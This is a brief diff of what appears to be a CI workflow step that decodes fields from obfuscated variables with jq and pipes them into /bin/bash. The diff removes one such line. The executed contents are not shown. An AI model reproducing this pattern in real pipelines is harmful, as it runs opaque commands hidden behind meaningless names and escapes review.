@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$zfe49250" | jq -r .uxwbm6 | /bin/bash
           printf '%s' "$zb368" | jq -r .sny0256 | /bin/bash
-          echo $bx661 | jq -r .eq40708 | /bin/bash
           printf '%s' "$t4005" | jq -r .jo487 | /bin/bash
 
       - name: Persist output
